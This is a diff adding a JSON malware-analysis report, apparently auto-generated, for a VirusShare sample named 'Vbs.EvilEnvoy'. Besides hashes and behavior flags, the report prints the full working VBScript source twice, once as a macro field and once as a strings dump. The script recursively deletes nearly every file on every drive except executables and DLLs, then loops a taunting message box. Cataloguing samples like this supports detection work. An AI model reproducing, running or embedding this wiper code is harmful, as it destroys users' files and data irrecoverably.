@@ -1,0 +1,63 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "createobject": "May create an OLE object",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "' Vbs.EvilEnvoy - By SAD1c\non error resume next\ndim fso,drive,file,all,folder,fileext,msg\nset fso=createobject(\"scripting.filesystemobject\")\nfor each drive in fso.drives\n\tif drive.isready then\n\t\tdirlist(drive.path&\"\\\")\n\tend if\nnext\nsub dirlist(dirpath)\n\ton error resume next\n\tset all=fso.getfolder(dirpath)\n\tfor each file in all.files\n\t\terasefile(file.path)\n\tnext\n\tfor each folder in all.subfolders\n\t\tdirlist(folder.path)\n\tnext\nend sub\nsub erasefile(filepath)\n\ton error resume next\n\tfileext=lcase(fso.getextensionname(filepath))\n\tif fileext<>\"exe\" and fileext<>\"com\" and fileext<>\"dll\" then\n\t\tfso.deletefile filepath,1\n\tend if\nend sub\nmsg=\"Nothing personal, but my \"\"Vbs.EvilEnvoy\"\" killed almost all of your files. Hope you had some backups...\"&vbcrlf&\"Greetings,\"&vbcrlf&\"\tSAD1c\"\ndo\nmsgbox msg,4096,\"Vbs.EvilEnvoy Striked! Your system's security sucks!\"\nloop"
+    },
+    "filename": "VirusShare_ee272fb70a28e5dd9d9ba165afe73d60",
+    "filesize": 889,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "ee272fb70a28e5dd9d9ba165afe73d60",
+        "sha1": "110f6bd3a89ac1e59358c7bdef2e6d781e79faed",
+        "sha256": "2edb458fc94c518f35a8426a6ad026a5211759c670667eca3624d0a172e7e405"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "' Vbs.EvilEnvoy - By SAD1c",
+            "on error resume next",
+            "dim fso,drive,file,all,folder,fileext,msg",
+            "set fso=createobject(\"scripting.filesystemobject\")",
+            "for each drive in fso.drives",
+            "\tif drive.isready then",
+            "\t\tdirlist(drive.path&\"\\\")",
+            "\tend if",
+            "next",
+            "sub dirlist(dirpath)",
+            "\ton error resume next",
+            "\tset all=fso.getfolder(dirpath)",
+            "\tfor each file in all.files",
+            "\t\terasefile(file.path)",
+            "\tnext",
+            "\tfor each folder in all.subfolders",
+            "\t\tdirlist(folder.path)",
+            "\tnext",
+            "end sub",
+            "sub erasefile(filepath)",
+            "\ton error resume next",
+            "\tfileext=lcase(fso.getextensionname(filepath))",
+            "\tif fileext<>\"exe\" and fileext<>\"com\" and fileext<>\"dll\" then",
+            "\t\tfso.deletefile filepath,1",
+            "\tend if",
+            "end sub",
+            "msg=\"Nothing personal, but my \"\"Vbs.EvilEnvoy\"\" killed almost all of your files. Hope you had some backups...\"&vbcrlf&\"Greetings,\"&vbcrlf&\"\tSAD1c\"",
+            "msgbox msg,4096,\"Vbs.EvilEnvoy Striked! Your system's security sucks!\"",
+            "loop"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.300551",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
